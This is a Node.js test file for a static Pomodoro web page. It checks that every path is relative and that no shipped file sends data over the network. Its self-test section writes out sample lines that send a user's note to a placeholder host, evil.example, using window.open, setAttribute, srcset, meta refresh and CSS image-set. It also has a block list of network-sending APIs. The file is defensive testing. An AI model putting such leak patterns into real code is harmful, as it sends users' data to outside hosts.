// Checks the whole shipped page, statically, for the shared-link story (AF-15).
// The app is served from https://tctorn.github.io/pomodoro/ (a sub-path), so
// every path must be relative, and nothing may talk to a network.
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync, existsSync, statSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { dirname, resolve, join, relative, sep } from "node:path";
import { fileURLToPath } from "node:url";

const root = dirname(fileURLToPath(import.meta.url));

// Shipped = every js/mjs/cjs/html/htm/css/svg file in the tree (GitHub Pages
// publishes the whole repo), except *.test.js. Case-insensitive. Walked
// recursively so a future notes.js, sub/notes.mjs or notes.css is covered
// automatically. Paths use "/".
const SHIPPED = /\.(?:[cm]?js|html?|css|svg)$/i;
const SKIP_DIRS = new Set([".git", "node_modules"]);
function walk(dir, rel = "") {
  const out = [];
  for (const name of readdirSync(join(dir, rel))) {
    const r = rel ? `${rel}/${name}` : name;
    if (statSync(join(dir, r)).isDirectory()) {
      if (!SKIP_DIRS.has(name)) out.push(...walk(dir, r));
    } else if (SHIPPED.test(name) && !name.endsWith(".test.js")) out.push(r);
  }
  return out;
}
function shippedFiles() {
  return walk(root).sort();
}
const isJs = (f) => /\.[cm]?js$/i.test(f);
const isCss = (f) => /\.css$/i.test(f);
const isHtml = (f) => /\.(?:html?|svg)$/i.test(f); // svg is markup: same attributes
const read = (f) => readFileSync(resolve(root, f), "utf8");

// Removes comments without touching comment-like text inside string literals
// (so "http://x" in a string is still seen). Regex literals are not parsed;
// none are used with quotes/slashes that would confuse this in the shipped code.
// Known limit: a regex literal containing "//" or a quote (e.g. /\//) can
// confuse the stripper.
// Known limit: a static scan cannot see same-origin URL exfiltration (data put
// into a link/navigation to our own origin); to be revisited in AF-14.
function stripJs(src) {
  let out = "";
  for (let i = 0; i < src.length; ) {
    const c = src[i], n = src[i + 1];
    if (c === "/" && n === "/") { while (i < src.length && src[i] !== "\n") i++; }
    else if (c === "/" && n === "*") {
      const end = src.indexOf("*/", i + 2);
      i = end === -1 ? src.length : end + 2;
    } else if (c === '"' || c === "'" || c === "`") {
      let j = i + 1;
      while (j < src.length && src[j] !== c) j += src[j] === "\\" ? 2 : 1;
      out += src.slice(i, j + 1);
      i = j + 1;
    } else { out += c; i++; }
  }
  return out;
}
const stripCss = (s) => s.replace(/\/\*[\s\S]*?\*\//g, "");
const stripHtml = (s) => s.replace(/<!--[\s\S]*?-->/g, "");
const strip = (f, src) =>
  isJs(f) ? stripJs(src) : isCss(f) ? stripCss(src) : stripHtml(src);
const code = (f) => strip(f, read(f));

// Local references found in a file: [kind, path].
function references(f) {
  return referencesIn(f, code(f));
}
function referencesIn(f, s) {
  const refs = [];
  const add = (kind, re) => { for (const m of s.matchAll(re)) refs.push([kind, m[1]]); };
  if (isHtml(f)) {
    // Quoted or unquoted attribute values.
    const val = String.raw`\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`;
    for (const attr of ["src", "href", "formaction", "poster", "data", "srcset"]) {
      for (const m of s.matchAll(new RegExp(String.raw`\s(?:xlink:)?${attr}${val}`, "gi"))) {
        const v = m[1] ?? m[2] ?? m[3];
        if (attr === "srcset") {
          // "url 1x, url2 640w": split on commas, keep the URL part of each candidate.
          for (const cand of v.split(",")) refs.push([attr, cand.trim().split(/\s+/)[0]]);
        } else refs.push([attr, v]);
      }
    }
  } else if (isCss(f)) {
    add("url", /url\(\s*["']?([^"')]*)["']?\s*\)/gi);
    add("import", /@import\s+["']([^"']*)["']/gi);
  } else {
    add("import", /\bimport\s*(?:[^"'`;]*?\sfrom\s*)?["']([^"']+)["']/g);
    add("import", /\bexport\s[^"'`;]*?\sfrom\s*["']([^"']+)["']/g);
    add("dynamic import", /\bimport\s*\(\s*["']([^"']+)["']/g);
    add("worker", /new\s+(?:Shared)?Worker\s*\(\s*["']([^"']+)["']/g);
    add("importScripts", /importScripts\s*\(\s*["']([^"']+)["']/g);
  }
  return refs.filter(([, p]) => p !== "" && !p.startsWith("#"));
}

// Contents of every string literal (incl. template literals) in comment-stripped JS.
function jsStrings(s) {
  const out = [];
  for (let i = 0; i < s.length; ) {
    const c = s[i];
    if (c === '"' || c === "'" || c === "`") {
      let j = i + 1;
      while (j < s.length && s[j] !== c) j += s[j] === "\\" ? 2 : 1;
      out.push(s.slice(i + 1, j));
      i = j + 1;
    } else i++;
  }
  return out;
}
// JS string literals starting with "/": root-absolute paths (break under the
// /pomodoro/ sub-path) and, with "//", protocol-relative external URLs.
function absolutePathLiterals(f, s = code(f)) {
  return isJs(f) ? jsStrings(s).filter((l) => l.startsWith("/")) : [];
}
// Protocol-relative external URLs ("//host"): any JS string starting with "//";
// in HTML/CSS "//host" after whitespace, a quote, "(", "=" or ",". Covers
// srcset, meta refresh (url=//x), image-set("//x"), window.open("//x") etc.
function protocolRelative(f, s = code(f)) {
  if (isJs(f)) return jsStrings(s).filter((l) => l.startsWith("//"));
  return s.match(/(?:^|[\s"'(=,]|url=)\/\/[a-z0-9.-]+/gi) ?? [];
}

describe("Scenario: Opening the app from the link", () => {
  test("the page shows the timer and Start button and needs no sign-in", () => {
    const html = stripHtml(read("index.html"));
    assert.match(html, /<[^>]+\bid="timer"/);
    assert.match(html, /<button\b[^>]*\bid="start"[^>]*>\s*Start\s*<\/button>/);
    assert.doesNotMatch(html, /type\s*=\s*["']?password/i);
    assert.doesNotMatch(html, /autocomplete\s*=\s*["']?(username|current-password|new-password)/i);
    // "register" may false-positive on innocent copy; acceptable for a tiny page.
    assert.doesNotMatch(html, /\b(log\s?in|sign\s?in|sign\s?up|register)\b/i);
  });

  test("the page needs no installation: no manifest and no service worker", () => {
    const all = shippedFiles().map(code).join("\n");
    assert.doesNotMatch(read("index.html"), /rel\s*=\s*["']manifest/i);
    assert.doesNotMatch(all, /serviceWorker/);
  });

  test("every reference is relative (./ or ../), never absolute or external", () => {
    const bad = [];
    for (const f of shippedFiles()) {
      for (const [kind, p] of references(f)) {
        if (!/^\.\.?\//.test(p)) bad.push(`${f}: ${kind} "${p}"`);
      }
      for (const p of absolutePathLiterals(f)) bad.push(`${f}: absolute path literal "${p}"`);
    }
    assert.deepEqual(bad, []);
  });

  test("every script, stylesheet, module and worker referenced actually exists", () => {
    assert.ok(references("index.html").some(([k, p]) => k === "src" && p === "./ui.js"), "page loads ui.js");
    assert.ok(references("index.html").some(([k, p]) => k === "href" && p === "./style.css"), "page loads style.css");
    const shipped = shippedFiles();
    const missing = [];
    for (const f of shipped) {
      for (const [kind, p] of references(f)) {
        const target = resolve(root, dirname(f), p);
        if (!existsSync(target)) missing.push(`${f}: ${kind} "${p}"`);
        // Must also be scanned, so e.g. <script src="./notes.txt"> cannot bypass the scan.
        else if (!shipped.includes(relative(root, target).split(sep).join("/"))) {
          missing.push(`${f}: ${kind} "${p}" is not a scanned file type`);
        }
      }
    }
    assert.deepEqual(missing, []);
  });

  test("the files published as-is: .nojekyll exists at the root, is tracked by git and is empty", (t) => {
    const file = resolve(root, ".nojekyll");
    assert.ok(existsSync(file), ".nojekyll exists");
    assert.equal(statSync(file).size, 0, ".nojekyll is empty");
    try {
      execFileSync("git", ["ls-files", "--error-unmatch", ".nojekyll"], { cwd: root, stdio: "pipe" });
    } catch (e) {
      if (e.code === "ENOENT") return t.skip("git is not available");
      assert.fail(`.nojekyll is not tracked by git: ${String(e.stderr || e.message).trim()}`);
    }
  });
});

describe("Scenario: No data leaves the browser", () => {
  const banned = [
    ["fetch(", /\bfetch\s*\(/],
    ["XMLHttpRequest", /XMLHttpRequest/],
    ["navigator.sendBeacon", /sendBeacon/],
    ["WebSocket", /WebSocket/],
    ["EventSource", /EventSource/],
    ["importScripts with a URL", /importScripts\s*\(\s*["'`]\s*(https?:)?\/\//],
    ["<form action=", /<form\b[^>]*\baction\s*=/i],
    ["<form method=post", /<form\b[^>]*\bmethod\s*=\s*["']?post/i],
    ["<img>/<iframe>/<embed>/<link>/<script> to external host", /<(?:img|iframe|embed|object|link|script|source|audio|video)\b[^>]*\b(?:src|href|data)\s*=\s*["']?(?:https?:)?\/\//i],
    ["http(s):// URL", /https?:\/\//i],
  ];

  test("no network-sending API or external resource in any shipped file", () => {
    const files = shippedFiles();
    for (const f of ["index.html", "style.css", "ui.js"]) assert.ok(files.includes(f), `${f} is scanned`);
    assert.ok(!files.some((f) => f.endsWith(".test.js")));
    const hits = [];
    for (const f of files) {
      const s = code(f);
      for (const [name, re] of banned) if (re.test(s)) hits.push(`${f}: ${name}`);
      if (protocolRelative(f, s).length) hits.push(`${f}: protocol-relative URL`);
    }
    assert.deepEqual(hits, []);
  });

  test("the scan itself detects violations and ignores comments", () => {
    assert.match(stripJs('fetch("x") // ok'), /fetch\(/);
    assert.doesNotMatch(stripJs("// fetch(1)\n/* https://a.b */ let a;"), /fetch|https/);
    assert.match(stripJs('const u = "https://a.b"; // c'), /https:\/\//);
    assert.doesNotMatch(stripCss("/* url(http://a) */ a{}"), /http/);
    const pr = (f, src) => protocolRelative(f, strip(f, src)).length > 0;
    assert.ok(pr("x.js", 'window.open("//evil.example/?n=" + note)'), "window.open");
    assert.ok(pr("x.js", 'img.setAttribute("src", "//evil.example/?" + note)'), "setAttribute");
    assert.ok(pr("x.html", '<img srcset="//evil.example/a.png 1x">'), "srcset");
    assert.ok(pr("x.html", '<meta http-equiv="refresh" content="0;url=//evil.example">'), "meta refresh");
    assert.ok(pr("x.css", 'a{background:image-set("//evil.example/a.png" 1x)}'), "image-set");
    assert.ok(!pr("x.html", '<a href="./a.png">a//b</a>'), "no false positive on relative/plain text");
    assert.deepEqual(absolutePathLiterals("x.js", "const a = `/x`;"), ["/x"]);
    const refs = referencesIn("x.html", '<img srcset="./a.png 1x, //e.example/b.png 2x"><form formaction=/x><video poster="/p.png"><object data="./d.svg">');
    assert.deepEqual(refs.map(([, p]) => p).sort(), ["./a.png", "./d.svg", "//e.example/b.png", "/p.png", "/x"]);
  });
});
